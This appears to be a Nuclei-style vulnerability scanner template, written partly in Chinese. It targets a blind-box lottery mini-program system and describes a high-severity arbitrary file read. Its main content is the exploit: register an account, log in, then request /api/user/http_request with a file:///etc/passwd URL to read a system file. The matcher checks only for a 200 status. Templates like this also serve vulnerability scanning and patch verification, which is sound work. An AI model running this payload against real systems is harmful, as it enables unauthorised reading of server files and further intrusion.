id: poc-ngu472gn60gazgoy
info:
  name: 盲盒抽奖小程序系统http_request存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: lfi,2024
http:
- raw:
  - '首先去 /index/user/register.html 注册一个账号，默认开放注册的，然后登录即可使用Payload


    GET /api/user/http_request?url=file:///etc/passwd HTTP/1.1'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
